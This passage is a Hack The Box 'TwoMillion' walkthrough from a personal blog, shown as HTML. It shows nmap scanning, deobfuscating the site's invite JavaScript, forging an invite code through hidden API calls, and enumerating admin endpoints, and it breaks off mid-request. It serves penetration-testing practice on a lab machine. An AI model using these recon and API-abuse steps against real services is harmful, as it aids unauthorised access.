@@ -1,0 +1,366 @@
+<!doctype html>
+<html lang="en" data-accent="moss" data-f-ga4="G-ZMH6NLL7C7">
+<head>
+<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" /><script>try{var t=localStorage.getItem("facet-theme");if(/^(dark|light|auto)$/.test(t))document.documentElement.dataset.theme=t}catch(e){}</script>
+	<meta name="description" content="Hack The Box - TwoMillion" />
+	<meta name="author" content="Shengtuo Hu" />
+	<meta name="theme-color" content="#13161c" media="(prefers-color-scheme: dark)" />
+	<meta name="theme-color" content="#f5f7f9" media="(prefers-color-scheme: light)" />
+	<title>TwoMillion - nu1lptr</title>
+	<link rel="canonical" href="https://shengtuo.me/blog/htb/twomillion/" /><link rel="icon" href="https://shengtuo.me/favicon.ico" sizes="32x32" />
+	<link rel="icon" href="https://shengtuo.me/favicon.svg" type="image/svg+xml" />
+	<link rel="apple-touch-icon" href="https://shengtuo.me/apple-touch-icon.png" />
+	<link rel="alternate" type="application/rss+xml" title="nu1lptr - RSS Feed" href="https://shengtuo.me/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="nu1lptr - Atom Feed" href="https://shengtuo.me/atom.xml" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/facet.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/cast/cast-layered.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/icons.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/giallo.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/css/site.css" />
+
+	<meta property="og:site_name" content="nu1lptr" /><meta property="og:title" content="TwoMillion" />
+	<meta property="og:url" content="https://shengtuo.me/blog/htb/twomillion/" />
+	<meta property="og:description" content="Hack The Box - TwoMillion" />
+	<meta property="og:image" content="https://shengtuo.me/cards/blog/htb/twomillion.png" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="article:published_time" content="2025-06-08T10:00:00-07:00" />
+	<meta property="article:author" content="Shengtuo Hu" />
+	<meta property="article:tag" content="HackTheBox" /><meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="TwoMillion" />
+	<meta name="twitter:description" content="Hack The Box - TwoMillion" />
+	<meta name="twitter:image" content="https://shengtuo.me/cards/blog/htb/twomillion.png" />
+	<meta name="twitter:site" content="@ShengtuoHu" />
+	<meta name="twitter:creator" content="@ShengtuoHu" /><script type="application/ld+json">
+{
+	"@context": "https://schema.org",
+	"@type": "BlogPosting",
+	"@id": "https://shengtuo.me/blog/htb/twomillion/#article",
+	"mainEntityOfPage": "https://shengtuo.me/blog/htb/twomillion/",
+	"url": "https://shengtuo.me/blog/htb/twomillion/",
+	"headline": "TwoMillion",
+	"description": "Hack The Box - TwoMillion",
+	"datePublished": "2025-06-08T10:00:00-07:00",
+	"dateModified": "2025-06-08T10:00:00-07:00",
+	"image": "https://shengtuo.me/cards/blog/htb/twomillion.png",
+	"keywords": ["HackTheBox"],
+	"inLanguage": "en",
+	"author": {
+		"@type": "Person",
+		"@id": "https://shengtuo.me/#person",
+		"name": "Shengtuo Hu",
+		"url": "https://shengtuo.me/"
+	},
+	"publisher": { "@id": "https://shengtuo.me/#person" }
+}
+</script>
+
+
+
+</head>
+<body>
+  <a class="f-visually-hidden" href="#main">Skip to content</a>
+  <nav class="f-nav f-nav--fixed" aria-label="Site">
+  <a class="f-nav__brand" href="https://shengtuo.me">nu1lptr</a>
+  <a href="https://shengtuo.me/blog/" aria-current="page">Blog</a>
+  <a href="https://shengtuo.me/projects/">Projects</a>
+  <a href="https://shengtuo.me/resume/">Resume</a>
+  <button class="f-btn f-btn--quiet site-search-open" type="button" aria-label="Search" title="Search (/)" hidden>
+    <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg>
+  </button>
+  <button class="f-theme-toggle" type="button" data-f-theme-toggle>Auto</button>
+</nav>
+
+  
+<main id="main" class="f-docs f-prose" data-f-code-ln="true" data-f-code-wrap="true" data-f-code-frame="false">
+  <nav class="f-toc" aria-label="On this page" data-f-scrollspy>
+  <p class="f-docs__label">On this page</p>
+  <a href="#port-scanning">Port Scanning</a>
+  <a href="#investigation">Investigation</a><a class="site-toc-sub" href="#reverse-shell">Reverse Shell</a><a class="site-toc-sub" href="#ssh-into-the-box">SSH into the Box</a>
+  <a href="#cve-2023-0386">CVE-2023-0386</a>
+  <a href="#cve-2023-4911">CVE-2023-4911</a>
+  <a href="#references">References</a>
+</nav>
+
+  <article class="site-post">
+<header class="f-reading__title">
+  <p class="f-kicker"><a href="https://shengtuo.me/blog/">nu1lptr&#39;s Blog</a></p>
+  <h1>TwoMillion</h1>
+  <p class="f-meta site-post-meta">
+    <time datetime="2025-06-08">Jun 8, 2025</time> · 2 min read · <a href="https://shengtuo.me/tags/hackthebox/">HackTheBox</a> · <button class="f-btn f-btn--quiet site-share" type="button">Share</button><span class="site-share-status" role="status"></span>
+  </p>
+</header>
+
+    <ul>
+<li>TwoMillion (Easy): <a rel="noopener external" target="_blank" href="https://www.hackthebox.com/machines/twomillion">https://www.hackthebox.com/machines/twomillion</a></li>
+<li>My notes: <a rel="noopener external" target="_blank" href="https://github.com/h1994st/HTB/blob/main/TwoMillion/NOTES.md">https://github.com/h1994st/HTB/blob/main/TwoMillion/NOTES.md</a></li>
+</ul>
+<h2 id="port-scanning"><a class="zola-anchor" href="#port-scanning" aria-label="Link to this section">#</a>
+Port Scanning</h2>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -n -sS -T4 --top-ports</span><span class="z-10"> 6000 10.10.11.221</span></span>
+<span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A --top-ports</span><span class="z-10"> 80 10.10.11.221</span></span>
+<span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A --top-ports</span><span class="z-10"> 80</span><span class="z-6"> 2million.htb</span></span></code></pre>
+<p>Note that, we may need to add a reference to <code>/etc/hosts</code> so that we can access the website.</p>
+<p>Results:</p>
+<pre class="giallo z-code" data-lang="plain" data-wrap="false"><code data-lang="plain" data-wrap="false"><span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"><span>PORT   STATE SERVICE REASON         VERSION</span></span>
+<span class="giallo-l"><span>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="giallo-l"><span>| ssh-hostkey:</span></span>
+<span class="giallo-l"><span>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span></span>
+<span class="giallo-l"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=</span></span>
+<span class="giallo-l"><span>|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span></span>
+<span class="giallo-l"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM</span></span>
+<span class="giallo-l"><span>80/tcp open  http    syn-ack ttl 63 nginx</span></span>
+<span class="giallo-l"><span>|_http-favicon: Unknown favicon MD5: 20E95ACF205EBFDCB6D634B7440B0CEE</span></span>
+<span class="giallo-l"><span>|_http-trane-info: Problem with XML parsing of /evox/about</span></span>
+<span class="giallo-l"><span>| http-methods:</span></span>
+<span class="giallo-l"><span>|_  Supported Methods: GET</span></span>
+<span class="giallo-l"><span>|_http-title: Hack The Box :: Penetration Testing Labs</span></span>
+<span class="giallo-l"><span>| http-cookie-flags:</span></span>
+<span class="giallo-l"><span>|   /:</span></span>
+<span class="giallo-l"><span>|     PHPSESSID:</span></span>
+<span class="giallo-l"><span>|_      httponly flag not set</span></span>
+<span class="giallo-l"><span>Device type: general purpose</span></span>
+<span class="giallo-l"><span>Running: Linux 4.X|5.X</span></span>
+<span class="giallo-l"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span></span>
+<span class="giallo-l"><span>OS details: Linux 4.15 - 5.19</span></span>
+<span class="giallo-l"><span>TCP/IP fingerprint:</span></span>
+<span class="giallo-l"><span>OS:SCAN(V=7.97%E=4%D=6/5%OT=22%CT=7%CU=44630%PV=Y%DS=2%DC=T%G=Y%TM=68426014</span></span>
+<span class="giallo-l"><span>OS:%P=arm-apple-darwin24.4.0)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)O</span></span>
+<span class="giallo-l"><span>OS:PS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552S</span></span>
+<span class="giallo-l"><span>OS:T11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E</span></span>
+<span class="giallo-l"><span>OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F</span></span>
+<span class="giallo-l"><span>OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5</span></span>
+<span class="giallo-l"><span>OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z</span></span>
+<span class="giallo-l"><span>OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=</span></span>
+<span class="giallo-l"><span>OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%</span></span>
+<span class="giallo-l"><span>OS:CD=S)</span></span>
+<span class="giallo-l"><span>...</span></span></code></pre><h2 id="investigation"><a class="zola-anchor" href="#investigation" aria-label="Link to this section">#</a>
+Investigation</h2>
+<p>First, take a look at the obfuscated <code>inviteapi.min.js</code></p>
+<pre class="giallo z-code" data-lang="javascript"><code data-lang="javascript"><span class="giallo-l"><span class="z-2">eval</span><span>(</span><span class="z-7">function</span><span class="z-3">(</span><span class=" z-i">p</span><span class="z-3">,</span><span class=" z-i"> a</span><span class="z-3">,</span><span class=" z-i"> c</span><span class="z-3">,</span><span class=" z-i"> k</span><span class="z-3">,</span><span class=" z-i"> e</span><span class="z-3">,</span><span class=" z-i"> d</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span class="z-2">    e</span><span class="z-3"> =</span><span class="z-7"> function</span><span class="z-3">(</span><span class=" z-i">c</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span> c</span><span class="z-3">.</span><span class="z-2">toString</span><span class="z-9">(</span><span class="z-10">36</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3">    ;</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span class="z-9"> (</span><span class="z-3">!&#39;&#39;.</span><span class="z-2">replace</span><span class="z-9">(</span><span class="z-3">/</span><span class="z-3 z-i">^</span><span class="z-3">/,</span><span> String</span><span class="z-9">))</span><span class="z-3"> {</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        while</span><span class="z-9"> (</span><span>c</span><span class="z-3">--</span><span class="z-9">)</span><span class="z-3"> {</span></span>
+<span class="giallo-l"><span>            d</span><span class="z-9">[</span><span>c</span><span class="z-3">.</span><span class="z-2">toString</span><span class="z-9">(</span><span>a</span><span class="z-9">)]</span><span class="z-3"> =</span><span> k</span><span class="z-9">[</span><span>c</span><span class="z-9">]</span><span class="z-3"> ||</span><span> c</span><span class="z-3">.</span><span class="z-2">toString</span><span class="z-9">(</span><span>a</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">        }</span></span>
+<span class="giallo-l"><span>        k</span><span class="z-3"> =</span><span class="z-9"> [</span><span class="z-7">function</span><span class="z-3">(</span><span class=" z-i">e</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            return</span><span> d</span><span class="z-9">[</span><span>e</span><span class="z-9">]</span></span>
+<span class="giallo-l"><span class="z-3">        }</span></span>
+<span class="giallo-l"><span class="z-9">        ]</span><span class="z-3">;</span></span>
+<span class="giallo-l"><span class="z-2">        e</span><span class="z-3"> =</span><span class="z-7"> function</span><span class="z-3">() {</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            return</span><span class="z-3"> &#39;</span><span>\\</span><span class="z-6">w+</span><span class="z-3">&#39;</span></span>
+<span class="giallo-l"><span class="z-3">        }</span></span>
+<span class="giallo-l"><span class="z-3">        ;</span></span>
+<span class="giallo-l"><span>        c</span><span class="z-3"> =</span><span class="z-10"> 1</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3">    ;</span><span class="z-3 z-i">while</span><span class="z-9"> (</span><span>c</span><span class="z-3">--</span><span class="z-9">)</span><span class="z-3"> {</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span class="z-9"> (</span><span>k</span><span class="z-9">[</span><span>c</span><span class="z-9">])</span><span class="z-3"> {</span></span>
+<span class="giallo-l"><span>            p</span><span class="z-3"> =</span><span> p</span><span class="z-3">.</span><span class="z-2">replace</span><span class="z-9">(</span><span class="z-3">new</span><span class="z-2"> RegExp</span><span class="z-9">(</span><span class="z-3">&#39;</span><span>\\</span><span class="z-6">b</span><span class="z-3">&#39; +</span><span class="z-2"> e</span><span class="z-9">(</span><span>c</span><span class="z-9">)</span><span class="z-3"> + &#39;</span><span>\\</span><span class="z-6">b</span><span class="z-3">&#39;,&#39;</span><span class="z-6">g</span><span class="z-3">&#39;</span><span class="z-9">)</span><span class="z-3">,</span><span> k</span><span class="z-9">[</span><span>c</span><span class="z-9">])</span></span>
+<span class="giallo-l"><span class="z-3">        }</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    return</span><span> p</span></span>
+<span class="giallo-l"><span class="z-3">}</span><span>(</span><span class="z-3">&#39;</span><span class="z-6">1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:</span><span>\&#39;</span><span class="z-6">/d/e/n</span><span>\&#39;</span><span class="z-6">,c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:</span><span>\&#39;</span><span class="z-6">/d/e/k/l/m</span><span>\&#39;</span><span class="z-6">,c:1(0){3.2(0)},f:1(0){3.2(0)}})}</span><span class="z-3">&#39;,</span><span class="z-10"> 24</span><span class="z-3">,</span><span class="z-10"> 24</span><span class="z-3">, &#39;</span><span class="z-6">response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify</span><span class="z-3">&#39;.</span><span class="z-2">split</span><span>(</span><span class="z-3">&#39;</span><span class="z-6">|</span><span class="z-3">&#39;</span><span>)</span><span class="z-3">,</span><span class="z-10"> 0</span><span class="z-3">, {}</span><span>))</span></span></code></pre>
+<p>There are online tools that can help us beautify the obfuscated JavaScript, such as <a rel="noopener external" target="_blank" href="https://lelinhtinh.github.io/de4js/">de4js</a>. Here is the readable version:</p>
+<pre class="giallo z-code" data-lang="javascript"><code data-lang="javascript"><span class="giallo-l"><span class="z-7">function</span><span class="z-2"> verifyInviteCode</span><span class="z-3">(</span><span class=" z-i">code</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span class="z-7">    var</span><span> formData</span><span class="z-3"> = {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">code</span><span class="z-3">&quot;:</span><span> code</span></span>
+<span class="giallo-l"><span class="z-3">    };</span></span>
+<span class="giallo-l"><span>    $</span><span class="z-3">.</span><span class="z-2">ajax</span><span class="z-9">(</span><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-9">        type</span><span class="z-3">: &quot;</span><span class="z-6">POST</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-9">        dataType</span><span class="z-3">: &quot;</span><span class="z-6">json</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-9">        data</span><span class="z-3">:</span><span> formData</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-9">        url</span><span class="z-3">: &#39;</span><span class="z-6">/api/v1/invite/verify</span><span class="z-3">&#39;,</span></span>
+<span class="giallo-l"><span class="z-2">        success</span><span class="z-3">:</span><span class="z-7"> function</span><span class="z-3"> (</span><span class=" z-i">response</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span>            console</span><span class="z-3">.</span><span class="z-2">log</span><span class="z-9">(</span><span>response</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">        },</span></span>
+<span class="giallo-l"><span class="z-2">        error</span><span class="z-3">:</span><span class="z-7"> function</span><span class="z-3"> (</span><span class=" z-i">response</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span>            console</span><span class="z-3">.</span><span class="z-2">log</span><span class="z-9">(</span><span>response</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">        }</span></span>
+<span class="giallo-l"><span class="z-3">    }</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">function</span><span class="z-2"> makeInviteCode</span><span class="z-3">() {</span></span>
+<span class="giallo-l"><span>    $</span><span class="z-3">.</span><span class="z-2">ajax</span><span class="z-9">(</span><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-9">        type</span><span class="z-3">: &quot;</span><span class="z-6">POST</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-9">        dataType</span><span class="z-3">: &quot;</span><span class="z-6">json</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-9">        url</span><span class="z-3">: &#39;</span><span class="z-6">/api/v1/invite/how/to/generate</span><span class="z-3">&#39;,</span></span>
+<span class="giallo-l"><span class="z-2">        success</span><span class="z-3">:</span><span class="z-7"> function</span><span class="z-3"> (</span><span class=" z-i">response</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span>            console</span><span class="z-3">.</span><span class="z-2">log</span><span class="z-9">(</span><span>response</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">        },</span></span>
+<span class="giallo-l"><span class="z-2">        error</span><span class="z-3">:</span><span class="z-7"> function</span><span class="z-3"> (</span><span class=" z-i">response</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span>            console</span><span class="z-3">.</span><span class="z-2">log</span><span class="z-9">(</span><span>response</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">        }</span></span>
+<span class="giallo-l"><span class="z-3">    }</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span></code></pre>
+<p>Let's call <code>makeInviteCode()</code>. The response result is pasted below:</p>
+<pre class="giallo z-code" data-lang="json"><code data-lang="json"><span class="giallo-l"><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">0</span><span class="z-3">&quot;:</span><span class="z-10"> 200</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">success</span><span class="z-3">&quot;:</span><span class="z-10"> 1</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">data</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-12">data</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-12">enctype</span><span class="z-3">&quot;: &quot;</span><span class="z-6">ROT13</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">    },</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">hint</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Data is encrypted ... We should probbably check the encryption type in order to decrypt it...</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span></code></pre>
+<p>Ok, we need to decode the string, which requires us to send a POST request to <code>/api/v1/invite/generate</code></p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-2">echo</span><span class="z-3"> &quot;</span><span class="z-6">Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr</span><span class="z-3">&quot; |</span><span class="z-12"> tr</span><span class="z-3"> &#39;</span><span class="z-6">a-zA-Z</span><span class="z-3">&#39; &#39;</span><span class="z-6">n-za-mN-ZA-M</span><span class="z-3">&#39;</span></span>
+<span class="giallo-l"><span class="z-1 z-i"># In order to generate the invite code, make a POST request to /api/v1/invite/generate</span></span></code></pre>
+<p>Reuse <code>$.ajax</code> and send the request in the browser console:</p>
+<pre class="giallo z-code" data-lang="javascript"><code data-lang="javascript"><span class="giallo-l"><span>$</span><span class="z-3">.</span><span class="z-2">ajax</span><span>(</span><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-9">    type</span><span class="z-3">: &quot;</span><span class="z-6">POST</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-9">    dataType</span><span class="z-3">: &quot;</span><span class="z-6">json</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-9">    url</span><span class="z-3">: &#39;</span><span class="z-6">/api/v1/invite/generate</span><span class="z-3">&#39;,</span></span>
+<span class="giallo-l"><span class="z-2">    success</span><span class="z-3">:</span><span class="z-7"> function</span><span class="z-3"> (</span><span class=" z-i">response</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span>        console</span><span class="z-3">.</span><span class="z-2">log</span><span class="z-9">(</span><span>response</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">    },</span></span>
+<span class="giallo-l"><span class="z-2">    error</span><span class="z-3">:</span><span class="z-7"> function</span><span class="z-3"> (</span><span class=" z-i">response</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span>        console</span><span class="z-3">.</span><span class="z-2">log</span><span class="z-9">(</span><span>response</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3">}</span><span>)</span></span></code></pre>
+<p>Here is the corresponding response:</p>
+<pre class="giallo z-code" data-lang="json"><code data-lang="json"><span class="giallo-l"><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">0</span><span class="z-3">&quot;:</span><span class="z-10"> 200</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">success</span><span class="z-3">&quot;:</span><span class="z-10"> 1</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">data</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-12">code</span><span class="z-3">&quot;: &quot;</span><span class="z-6">TDRDVDktOE40TzctVk9NMDktVlEzOFE=</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-12">format</span><span class="z-3">&quot;: &quot;</span><span class="z-6">encoded</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span></code></pre>
+<p>Obviously, the response contains a base64-encoded string. Decoding the string gives us the invite code</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-2">echo</span><span class="z-3"> &quot;</span><span class="z-6">TDRDVDktOE40TzctVk9NMDktVlEzOFE=</span><span class="z-3">&quot; |</span><span class="z-12"> base64</span><span class="z-6"> -d</span></span>
+<span class="giallo-l"><span class="z-1 z-i"># L4CT9-8N4O7-VOM09-VQ38Q</span></span></code></pre>
+<p>Now we can register an account with the obtained invite code. By the way, we can check if we can get the list of available API endpoints by visiting <code>http://2million.htb/api/v1</code>:</p>
+<pre class="giallo z-code" data-lang="json"><code data-lang="json"><span class="giallo-l"><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-3">  &quot;</span><span class="z-7">v1</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-12">user</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">      &quot;</span><span class="z-10">GET</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Route List</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/invite/how/to/generate</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Instructions on invite code generation</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/invite/generate</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Generate invite code</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/invite/verify</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Verify invite code</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/user/auth</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Check if user is authenticated</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/user/vpn/generate</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Generate a new VPN configuration</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/user/vpn/regenerate</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Regenerate VPN configuration</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/user/vpn/download</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Download OVPN file</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">      },</span></span>
+<span class="giallo-l"><span class="z-3">      &quot;</span><span class="z-10">POST</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/user/register</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Register a new user</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/user/login</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Login with existing user</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">      }</span></span>
+<span class="giallo-l"><span class="z-3">    },</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-12">admin</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">      &quot;</span><span class="z-10">GET</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/admin/auth</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Check if user is admin</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">      },</span></span>
+<span class="giallo-l"><span class="z-3">      &quot;</span><span class="z-10">POST</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/admin/vpn/generate</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Generate VPN for specific user</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">      },</span></span>
+<span class="giallo-l"><span class="z-3">      &quot;</span><span class="z-10">PUT</span><span class="z-3">&quot;: {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">/api/v1/admin/settings/update</span><span class="z-3">&quot;: &quot;</span><span class="z-6">Update user settings</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">      }</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3">  }</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span></code></pre>
+<p>Try to update the settings of our newly registered account. I tried to use <code>$.ajax</code> to send the PUT request, but it always reported that "Missing parameter: email".</p>
+<pre class="giallo z-code" data-lang="javascript"><code data-lang="javascript"><span class="giallo-l"><span>$</span><span class="z-3">.</span><span class="z-2">ajax</span><span>(</span><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-9">    type</span><span class="z-3">: &quot;</span><span class="z-6">PUT</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-9">    contentType</span><span class="z-3">: &quot;</span><span class="z-6">application/json</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-9">    data</span><span class="z-3">: {</span></span>
